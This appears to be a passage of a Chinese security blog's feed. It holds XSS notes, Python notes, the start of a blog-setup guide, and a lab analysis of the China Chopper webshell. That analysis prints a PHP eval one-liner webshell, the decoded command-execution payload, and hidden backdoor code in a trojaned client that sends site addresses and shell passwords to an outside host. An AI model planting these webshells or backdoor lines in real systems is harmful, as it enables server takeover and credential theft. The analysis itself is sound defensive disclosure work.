class="line">\u后面加4位16进制数字(或\x后加2位16进制数字)，按字符的unicode数值编码，不足位数以零补充。如&quot;&lt;&quot;转为&quot;\u003c&quot;或&quot;\x3c&quot;。</span><br><span class="line"></span><br><span class="line">4.编码含义</span><br><span class="line">浏览器对提交的编码进行自解析，执行。</span><br></pre></td></tr></table></figure><h2 id="XSS发生的位置"><a href="#XSS发生的位置" class="headerlink" title="XSS发生的位置"></a>XSS发生的位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.GET型URL中的XSS</span><br><span class="line">如果在URL中提交的参数值，在页面中显示，则可能存在XSS。</span><br><span class="line"></span><br><span class="line">2.POST型表单中的XSS</span><br><span class="line">在表单中提交的参数值，在页面中显示，则可能存在XSS。</span><br><span class="line"></span><br><span class="line">3.JSON中的XSS</span><br><span class="line">JSON是一种轻量级的数据交换格式，便于人阅读和编写，同时也易于机器解析和生成，并有效提升网络传输效率。</span><br><span class="line">JSON最常用的格式是对象的键值对。</span><br></pre></td></tr></table></figure><h2 id="自动化XSS挖掘工具-xsser"><a href="#自动化XSS挖掘工具-xsser" class="headerlink" title="自动化XSS挖掘工具-xsser"></a>自动化XSS挖掘工具-xsser</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.XSSer工具介绍</span><br><span class="line">xsser是一款用于针对web应用程序自动化挖掘、利用、报告xss漏洞的框架。</span><br><span class="line"></span><br><span class="line">2.工具原理</span><br><span class="line">官方网站：http:&#x2F;&#x2F;xsser.03c8.net</span><br><span class="line"></span><br><span class="line">3.xsser启动</span><br><span class="line">图形化界面：xsser --gtk</span><br></pre></td></tr></table></figure><h2 id="XSS-Fuzzing工具"><a href="#XSS-Fuzzing工具" class="headerlink" title="XSS Fuzzing工具"></a>XSS Fuzzing工具</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XSSstrike</span><br></pre></td></tr></table></figure><h2 id="XSS防御"><a href="#XSS防御" class="headerlink" title="XSS防御"></a>XSS防御</h2><h4 id="httponly防止盗cookie"><a href="#httponly防止盗cookie" class="headerlink" title="httponly防止盗cookie"></a>httponly防止盗cookie</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1.cookie</span><br><span class="line">cookie是某些网站为了辨别用户身份、进行session跟踪，而存储在用户本地终端上的数据（通常经过加密）。</span><br><span class="line">cookie有的是临时的，有的是持续的。临时的cookie只在浏览器上保存一段时间，超过规定时间，cookie就会被系统清除。</span><br><span class="line"></span><br><span class="line">2.cookie作用</span><br><span class="line">cookie是存储在客户端的一小段数据，浏览器通过HTTP协议合服务端进行cookie交互，通常用来存储一些不敏感信息。</span><br><span class="line"></span><br><span class="line">3.清除cookie</span><br><span class="line">通过浏览器工具清除cookie；</span><br><span class="line">通过设置cookie的有效期来清除cookie，删除cookie可能导致某些页面不可用。</span><br><span class="line"></span><br><span class="line">4.cookie httponly</span><br><span class="line">setcookie(&quot;abc&quot;,&quot;test&quot;,NULL,NULL,NULL,NULL,TRUE)，设置secure参数为true后，就不能使用js获取cookie。</span><br></pre></td></tr></table></figure><h4 id="XSS-Filter过滤器"><a href="#XSS-Filter过滤器" class="headerlink" title="XSS Filter过滤器"></a>XSS Filter过滤器</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.htmlspecialchars()函数</span><br><span class="line">把预定义的字符转换为HTML实体。</span><br><span class="line">预定义字符：</span><br><span class="line">&amp;和号变成&amp;</span><br><span class="line">&quot;双引号变成&quot;</span><br><span class="line">&#39;单引号变成&#39;</span><br><span class="line">&lt;小于变成&lt;</span><br><span class="line">&gt;大于变成&gt;</span><br><span class="line"></span><br><span class="line">2.htmlentities()函数</span><br><span class="line">对于过滤用户输入的数据非常有用，它会将一些特殊字符转换为HTML实体。</span><br><span class="line">例如用户输入&lt;，就会被该函数转化为HTML实体&lt;(&amp;alt)</span><br><span class="line"></span><br><span class="line">3.strip_tags()函数</span><br><span class="line">该函数会剥去字符串中的HTML、XML以及PHP的标签。</span><br><span class="line">该函数始终会剥离HTML注释，这点无法通过allow参数改变。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="web安全" scheme="http://yoursite.com/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="http://yoursite.com/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>python基础教程</title>
    <link href="http://yoursite.com/2020/07/05/python%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/07/05/python基础教程/</id>
    <published>2020-07-05T01:21:08.000Z</published>
    <updated>2020-07-05T03:18:21.655Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="lt-Python基础教程-第3版-gt-读书笔记"><a href="#lt-Python基础教程-第3版-gt-读书笔记" class="headerlink" title="&lt;Python基础教程-第3版&gt;读书笔记"></a>&lt;Python基础教程-第3版&gt;读书笔记</h1><p>本书全本以python3为例</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h4 id="数和表达式"><a href="#数和表达式" class="headerlink" title="数和表达式"></a>数和表达式</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">加减：2+2，4-2</span><br><span class="line"></span><br><span class="line">除法：运算结果是小数，即浮点数</span><br><span class="line">1&#x2F;2&#x3D;0.5</span><br><span class="line">1&#x2F;1&#x3D;1.0</span><br><span class="line"></span><br><span class="line">双斜杠：丢弃小数部分，执行整除运算</span><br><span class="line">1&#x2F;&#x2F;2&#x3D;0</span><br><span class="line">1&#x2F;&#x2F;1&#x3D;1</span><br><span class="line">10&#x2F;&#x2F;3&#x3D;3</span><br><span class="line">10&#x2F;&#x2F;-3&#x3D;-4 &#x2F;&#x2F;结果为负数时，圆整后将离0更远，向下圆整到-4</span><br><span class="line"></span><br><span class="line">求余(取模)运算符，x%y结果为x除以y的余数，即执行整除时余下的部分</span><br><span class="line">10&#x2F;&#x2F;3&#x3D;3</span><br><span class="line">10%3&#x3D;1</span><br><span class="line">9%3&#x3D;0</span><br><span class="line">10%-3&#x3D;-2</span><br><span class="line">-10%3&#x3D;2</span><br><span class="line"></span><br><span class="line">乘方求幂运算符</span><br><span class="line">-3**2&#x3D;-9</span><br><span class="line">(-3)**2&#x3D;9</span><br><span class="line">乘方的优先级比求负高，因此-3**2等价于-(3**2)</span><br></pre></td></tr></table></figure><h4 id="进制"><a href="#进制" class="headerlink" title="进制"></a>进制</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">十六进制表示：0x</span><br><span class="line"></span><br><span class="line">八进制表示：0o</span><br><span class="line"></span><br><span class="line">二进制表示：0b</span><br></pre></td></tr></table></figure><h4 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h4><p>在python中，变量名称只能由字母、数字和下划线构成，且不能以数字开头。</p><p>变量即表示特定值的名称</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x&#x3D;3表示赋值</span><br><span class="line">使用python变量前必须赋值</span><br></pre></td></tr></table></figure><h4 id="获取用户输入"><a href="#获取用户输入" class="headerlink" title="获取用户输入"></a>获取用户输入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">input</span><br><span class="line">如x&#x3D;input(&quot;x:&quot;)</span><br></pre></td></tr></table></figure><h4 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h4><p>python提供了大量的内置函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">乘方 pow</span><br><span class="line">绝对值 abs</span><br></pre></td></tr></table></figure><h4 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h4><p>可将模块视为扩展，导入扩展python功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">导入模块命令：import</span><br><span class="line"></span><br><span class="line">通过使用import的变种from moudle import function，可在调用函数时不指定模块前缀:</span><br><span class="line">from math import sqrt</span><br><span class="line"></span><br><span class="line">nan具有特殊含义，指的是非数值</span><br></pre></td></tr></table></figure><h4 id="执行程序"><a href="#执行程序" class="headerlink" title="执行程序"></a>执行程序</h4><p>在命令提示符下运行脚本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python xxx.py</span><br></pre></td></tr></table></figure><p>在Linux中运行脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">脚本第一行 #! &#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">要像普通程序一样运行：chmod +x hello.py即可</span><br></pre></td></tr></table></figure><p>注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在python中，#为注释，在代码中，井号后面到行尾的内容都将被忽略。</span><br></pre></td></tr></table></figure><h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><p>单引号、双引号、三引号都可以表示字符串，其中三引号可表示换行的长字符串。</p><p>字符串转义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;可对字符串进行转义，如</span><br><span class="line">&#39;Let\&#39;s go&#39;经过转义，里面的引号不会被认为是字符串结束符，输出为&#39;Let&#39;s go&#39;</span><br></pre></td></tr></table></figure><p>原始字符串</p><p>对于很长的路径，将使用大量的反斜杠。可使用原始字符串，因为原始字符串不会对反斜杠做特殊处理，会让字符串包含的每个字符都保持原样，用前缀 r 表示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(r&#39;C:\nextwhere&#39;)</span><br><span class="line">结果为C:\nextwhere</span><br></pre></td></tr></table></figure><h4 id="字节编码"><a href="#字节编码" class="headerlink" title="字节编码"></a>字节编码</h4><p>Python字符串使用Unicode编码来表示文本，几乎在所有情况下，最好使用UTF-8</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;hello word&quot;.encode(&quot;UTF-8&quot;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>中国菜刀分析及隐藏后门</title>
    <link href="http://yoursite.com/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/"/>
    <id>http://yoursite.com/2020/07/04/中国菜刀分析及隐藏后门/</id>
    <published>2020-07-04T14:26:41.000Z</published>
    <updated>2020-07-04T15:35:33.626Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="中国菜刀分析及隐藏后门"><a href="#中国菜刀分析及隐藏后门" class="headerlink" title="中国菜刀分析及隐藏后门"></a>中国菜刀分析及隐藏后门</h1><h2 id="用到的工具"><a href="#用到的工具" class="headerlink" title="用到的工具"></a>用到的工具</h2><h4 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h4><p>中国菜刀是一款专业的网站管理软件，用途广泛，使用方便，小巧实用。只要支持动态脚本的网站，都可以用中国菜刀来进行管理！在非简体中文环境下使用，自动切换到英文界面。UINCODE方式编译，支持多国语言输入显示。</p><h4 id="winsock-expert"><a href="#winsock-expert" class="headerlink" title="winsock expert"></a>winsock expert</h4><p> 一个用来监视和修改网络发送和接收数据的程序，WinSock Expert可以用来帮助您调试网络应用程序，分析网络程序的通信协议（如分析OICQ的发送接收数据），并且在必要的时候能够修改发送的数据。</p><h4 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h4><p>Wireshark是免费的网络协议检测分析程序。让您经由程序抓取运行的网站的相关资讯，包括每一封包流向及其内容、资讯可依操作系统语系看出,方便查看、监控TCP session动态等等。</p><h4 id="PEID"><a href="#PEID" class="headerlink" title="PEID"></a>PEID</h4><p>一款专业很好用的查壳软件，几乎可以侦测出所有的壳，其数量已超过470 种PE文档 的加壳类型和签名，另外还可识别出EXE文件是用什么语言编写的，比如：VC++、Delphi、VB或Delphi等。</p><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>我们通过peid等工具可以看出来加壳了：</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704224735501.png" alt="image-20200704224735501"></p><p>  通过winhex，也可以看到菜刀经过upx加壳处理：</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225123980.png" alt="image-20200704225123980"></p><p>进行脱壳处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx.exe -d 目标文件</span><br></pre></td></tr></table></figure><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225645446.png" alt="image-20200704225645446"></p><p>再用peid查看，可以看到已经没有壳了，并且可以看出是vc++6.0编写</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704225813247.png" alt="image-20200704225813247"></p><p>接下来把它的可见字符串打印出来看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.exe  caidao.exe</span><br></pre></td></tr></table></figure><p>由于字符串太多，我们可以有目的性地查找字符串如chopper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string.exe  caidao.exe | findstr chopper</span><br></pre></td></tr></table></figure><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704230218566.png" alt="image-20200704230218566"></p><h2 id="动态分析"><a href="#动态分析" class="headerlink" title="动态分析"></a>动态分析</h2><p>在靶机上写一个php一句话放在网站的根目录下，如1.php,内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;</span><br></pre></td></tr></table></figure><p>然后在攻击机打开wireshark准备监听数据包，同时使用菜刀进行连接</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231058773.png" alt="image-20200704231058773"></p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231131527.png" alt="image-20200704231131527"></p><p> 监听到的数据包如下:</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231214377.png" alt="image-20200704231214377"></p><p>客户端在80端口上，以HTTP POST方式通讯，追踪tcp流来查看整个tcp数据交互过程。</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231350738.png" alt="image-20200704231350738"></p><p>红色部分为攻击机POST提交控制命令的内容，下面蓝色部分为靶机返回结果。</p><p>z0,z1,z2三个参数，我们分别解码。</p><p>到红色部分的代码经过base64以及url的编码，解码的顺序依次为url解码，然后再base64解码，得到明文</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231611163.png" alt="image-20200704231611163"></p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231643523.png" alt="image-20200704231643523"></p><p>明文如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z0&#x3D;@ini_set(&quot;display_errors&quot;,&quot;0&quot;)@set_time_limit(0)@set_magic_quotes_runtime(0)echo(&quot;-&gt;|&quot;);;$p&#x3D;base64_decode($_POST[&quot;z1&quot;]);$s&#x3D;base64_decode($_POST[&quot;z2&quot;]);$d&#x3D;dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);$c&#x3D;substr($d,0,1)&#x3D;&#x3D;&quot;&#x2F;&quot;?&quot;-c &#39;&#123;$s&#125;&#39;&quot;:&quot;&#x2F;c &#123;$s&#125;&quot;;$r&#x3D;&quot;&#123;$p&#125; &#123;$c&#125;&quot;;@system($r.&quot; 2&gt;&amp;1&quot;);;echo(&quot;|&lt;-&quot;);die();</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">z1&#x3D;cmd</span><br><span class="line">z2&#x3D;cd &#x2F;d &quot;D:\phpstudy\PHPTutorial\WWW\&quot;&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</span><br></pre></td></tr></table></figure><p>z1的值是cmd，z2的值是cd /d “c:\inetpub\wwwroot\”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]。该操作的意思就是执行输入的cmd命令，列出当前用户与当前目录，执行结果如下所示</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704231838173.png" alt="image-20200704231838173"></p><p> 以上就是中国菜刀的流量通信的特征。</p><h2 id="带有恶意后门的菜刀"><a href="#带有恶意后门的菜刀" class="headerlink" title="带有恶意后门的菜刀"></a>带有恶意后门的菜刀</h2><p>打开带有恶意后门的菜刀，启动抓包软件WSockExpert，点击左上角的文件夹图标，选择caidao.exe，点击open即可</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232016543.png" alt="image-20200704232016543"></p><p> 接下来连接菜刀</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232052587.png" alt="image-20200704232052587"></p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232124638.png" alt="image-20200704232124638"></p><p>菜刀连接以后我们可以随意操作一下（比如点击、切换文件夹等，以此来产生通信流量方便我们后续的分析）</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232203249.png" alt="image-20200704232203249"></p><p>回到winsock expert</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232336587.png" alt="image-20200704232336587"></p><p>将下面的字符串解码，先URL解码</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232424476.png" alt="image-20200704232424476"></p><p>再base64解码</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232516342.png" alt="image-20200704232516342"></p><p>可以看到还是存在密文，那么接着解码</p><p><img src="/2020/07/04/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80%E5%88%86%E6%9E%90%E5%8F%8A%E9%9A%90%E8%97%8F%E5%90%8E%E9%97%A8/image-20200704232605085.png" alt="image-20200704232605085"></p><p>明文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($_COOKIE[&#39;Lyke&#39;]!&#x3D;1)&#123;setcookie(&#39;Lyke&#39;,1);@file(&#39;http:&#x2F;&#x2F;www.7jyewu.cn&#x2F;hack.php?Url&#x3D;&#39;.$_SERVER[&#39;HTTP_HOST&#39;].$_SERVER[&#39;REQUEST_URI&#39;].&#39;&amp;Pass&#x3D;&#39;.key($_POST));&#125;</span><br></pre></td></tr></table></figure><p>这里的http://[www.]7jyewu.cn/hack.php就是这个菜刀的后门地址。</p><p> HTTP_HOST就是我们拿到shell的网站，REQUEST_URI就是shell的URI,Pass就是我们菜刀连接一句话时的密码。这段代码的大概意思就是，会将我们拿到shell的网站的地址，密码等都通过后门传送给这个网站的所有者。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.hetianlab.com/expc.do?ce=20b72c3f-e7bc-406f-b0a3-7bbc977758e3" target="_blank" rel="noopener">https://www.hetianlab.com/expc.do?ce=20b72c3f-e7bc-406f-b0a3-7bbc977758e3</a> 全面分析中国菜刀及隐藏后门 </p><p><a href="https://webshell6.com/" target="_blank" rel="noopener">https://webshell6.com/</a>  2020免杀菜刀</p>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="webshell" scheme="http://yoursite.com/categories/webshell/"/>
    
    
      <category term="中国菜刀" scheme="http://yoursite.com/tags/%E4%B8%AD%E5%9B%BD%E8%8F%9C%E5%88%80/"/>
    
  </entry>
  
  <entry>
    <title>博客搭建过程</title>
    <link href="http://yoursite.com/2020/07/03/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
    <id>http://yoursite.com/2020/07/03/博客搭建过程/</id>
    <published>2020-07-03T13:09:28.000Z</published>
    <updated>2020-07-03T14:34:28.405Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><h1 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>Win10专业版，64位</p><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>1.注册GitHub账号</p><p>2.下载安装Git for windows，一路next即可。</p><p>验证安装：任何位置鼠标右击出现git bash here</p><p>cmd下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p>3.下载安装node.js</p><p>验证安装，cmd下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p>4.npm会默认安装</p><h2 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h2><p>在GitHub上创建repository。</p><p>repository的名字必须为yourname.github.io，yourname为GitHub用户名，也就是访问的博客地址。</p><p>注册的邮箱一定要验证，不然不会成功。</p><h2 id="配置SSH-key"><a href="#配置SSH-key" class="headerlink" title="配置SSH key"></a>配置SSH key</h2><p>用于本地与GitHub进行数据交换。</p><h4 id="生成并配置key"><a href="#生成并配置key" class="headerlink" title="生成并配置key"></a>生成并配置key</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;xxx&quot;#你的github用户名</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;#填写你的github注册邮箱</span><br></pre></td></tr></table></figure><p>生成ssh密钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;. ssh#检查本机已存在的ssh密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;#生成密钥</span><br></pre></td></tr></table></figure><p>连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容。</p><p>打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key： title任意填写，将内容复制到key中即可。</p><h4 id="测试ssh"><a href="#测试ssh" class="headerlink" title="测试ssh"></a>测试ssh</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com #注意邮箱地址不用改</span><br></pre></td></tr></table></figure><p>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure><h2 id="使用Hexo"><a href="#使用Hexo" class="headerlink" title="使用Hexo"></a>使用Hexo</h2><p>以下所有命令在git bash下运行</p><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>验证安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>在本地主机上建立一个blog文件夹，用于日后代码，博客的存放，进入此目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p>此目录会自动生成hexo相关文件。</p><p>注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。</p><h4 id="安装npm插件"><a href="#安装npm插件" class="headerlink" title="安装npm插件"></a>安装npm插件</h4><figure class="highlight plain"><table><tr><td 